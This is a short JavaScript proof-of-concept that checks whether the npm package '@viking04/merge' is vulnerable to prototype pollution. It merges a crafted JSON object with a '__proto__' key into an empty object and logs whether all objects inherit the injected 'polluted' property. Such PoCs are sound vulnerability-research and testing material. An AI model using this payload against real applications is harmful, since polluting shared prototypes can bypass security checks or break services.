var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const merge = require('@viking04/merge');
console.log({}.polluted);
let a = {};
var prototype_pollution_test = JSON.parse('{"__proto__":{"polluted":"yes"}}');
merge(a, prototype_pollution_test);
console.log({}.polluted);